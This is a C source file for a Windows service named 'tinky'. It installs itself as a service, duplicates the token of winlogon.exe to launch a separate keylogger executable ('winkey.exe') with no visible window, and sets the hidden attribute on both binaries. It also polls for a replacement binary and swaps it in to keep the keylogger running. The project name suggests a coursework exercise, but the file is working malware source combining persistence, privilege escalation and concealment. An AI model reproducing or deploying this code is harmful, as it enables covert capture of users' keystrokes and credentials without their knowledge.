#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define SERVICE_NAME "tinky"
#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WIN10_TH2 0x0A00
#define _WIN32_WINNT_WIN10_RS1 0x0A00
#define _WIN32_WINNT_WIN10_RS2 0x0A00
#define _WIN32_WINNT_WIN10_RS3 0x0A00
#define _WIN32_WINNT_WIN10_RS4 0x0A00
#define _WIN32_WINNT_WIN10_RS5 0x0A00
#define NTDDI_WIN10_CU 0x0A000000

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
HANDLE hKeyloggerProcess = NULL;

int InstallService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }
    SC_HANDLE hService = CreateService(
        hSCManager, SERVICE_NAME, SERVICE_NAME,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        "Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe start",
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService)
    {
        printf("CreateService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return -1;
    }
    printf("Service installed successfully.\n");
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

int UninstallService(void)
{
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager)
    {
        printf("OpenSCManager failed: %lu\n", GetLastError());
        return -1;
    }
    
    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, DELETE);
    if (!hService)
    {
        printf("OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCManager);
        return -1;
    }
    if (DeleteService(hService))
    {
        printf("Service deleted successfully.\n");
    }
    else
    {
        printf("DeleteService failed: %lu\n", GetLastError());
    }
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return 0;
}

void StopKeylogger(void)
{
    if (hKeyloggerProcess)
    {
        TerminateProcess(hKeyloggerProcess, 0);
        CloseHandle(hKeyloggerProcess);
        hKeyloggerProcess = NULL;
    }
}

void WINAPI ControlHandler(DWORD request)
{
    switch (request)
    {
        case SERVICE_CONTROL_STOP:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            StopKeylogger();
            return;
        default:
            break;
    }
    SetServiceStatus(hStatus, &ServiceStatus);
}

DWORD FindProcessID(const char* processName) {
    DWORD processID = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe)) {
            do {
                if (strcmp(pe.szExeFile, processName) == 0) {
                    processID = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    return processID;
}

void StartKeylogger(void)
{
    DWORD pid = FindProcessID("winlogon.exe");
    if (pid == 0)
    {
        printf("Failed to find winlogon.exe process.\n");
        return;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
    if (!processHandle)
    {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return;
    }

    HANDLE tokenHandle = NULL;
    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle))
    {
        printf("OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return;
    }

    HANDLE dupTokenHandle = NULL;
    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupTokenHandle))
    {
        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(tokenHandle);
        CloseHandle(processHandle);
        return;
    }

    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessAsUser(dupTokenHandle, NULL, "Z:\\tinky-winkey\\winkey\\srcs\\winkey.exe", NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        printf("CreateProcessAsUser failed: %lu\n", GetLastError());
    }
    else
    {
        hKeyloggerProcess = pi.hProcess;
        CloseHandle(pi.hThread);
    }

    CloseHandle(dupTokenHandle);
    CloseHandle(tokenHandle);
    CloseHandle(processHandle);
}

int UpdateAvailable(const char* filePath)
{
    WIN32_FIND_DATA findFileData;
    HANDLE handle = FindFirstFile(filePath, &findFileData);
    int found = handle != INVALID_HANDLE_VALUE;
    if (found) FindClose(handle);
    return found;
}

DWORD WINAPI CheckForUpdates(LPVOID lpParam)
{
    (void)lpParam;
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        if (UpdateAvailable("Z:\\tinky-winkey\\tinky\\srcs\\new_tinky.exe"))
        {
            StopKeylogger();
            MoveFile("Z:\\tinky-winkey\\tinky\\srcs\\new_tinky.exe", "Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe");
            StartKeylogger();
        }
        Sleep(60000);
    }
    return 0;
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
{
    (void)argc;
    (void)argv;
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
    if (!hStatus) return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(hStatus, &ServiceStatus);

    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    StartKeylogger();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckForUpdates, NULL, 0, NULL);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
        Sleep(1000);
    }
}

void HideFiles(void)
{
    SetFileAttributes("Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe", FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributes("Z:\\tinky-winkey\\winkey\\srcs\\winkey.exe", FILE_ATTRIBUTE_HIDDEN);
}

int main(int argc, char* argv[])
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "install") == 0)
        {
            InstallService();
            HideFiles();
            return 0;
        }
        else if (strcmp(argv[1], "delete") == 0)
        {
            return UninstallService();
        }
        else if (strcmp(argv[1], "start") == 0)
        {
            SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
            StartServiceCtrlDispatcher(ServiceTable);
        }
        else if (strcmp(argv[1], "stop") == 0)
        {
            SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
            SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP);
            if (hService)
            {
                ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);
                CloseServiceHandle(hService);
            }
            CloseServiceHandle(hSCManager);
        }
    }
    else
    {
        printf("Usage: svc.exe [install | start | stop | delete]\n");
    }
    return 0;
}
